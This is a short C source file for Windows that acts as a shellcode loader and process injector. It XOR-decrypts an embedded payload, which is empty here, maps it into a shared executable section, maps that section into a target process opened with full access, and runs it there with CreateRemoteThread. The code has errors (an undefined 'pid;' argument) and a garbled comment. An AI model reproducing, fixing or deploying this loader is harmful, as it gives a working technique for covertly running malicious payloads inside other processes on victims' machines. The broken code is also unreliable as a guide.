#include <windows.h>
#include <stdio.h>
#pragma comment (lib, "OneCore.lib")
#define KEY 0x01


unsigned char encryptedShellcode[] ="";
;
int main(int argc, char** argv)
{
	char key[] = "key";
	char cipherType[] = "xor";
	
	unsigned char shellcode[sizeof encryptedShellcode];

		int j = 0;
	for (int i = 0; i < sizeof encryptedShellcode; i++) {
		if (j == sizeof key - 1) j = 0;
		shellcode[i] = encryptedShellcode[i] ^ key[j];
		j++;
		printf("\\x%x", shellcode[i]);
	}
	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);

	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));

	memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid;);//ÌîÐ´Òª×¢ÈëµÄpid

	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);

	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);

	UnmapViewOfFile(lpMapAddress);
	CloseHandle(hMapping);
	return 0;
}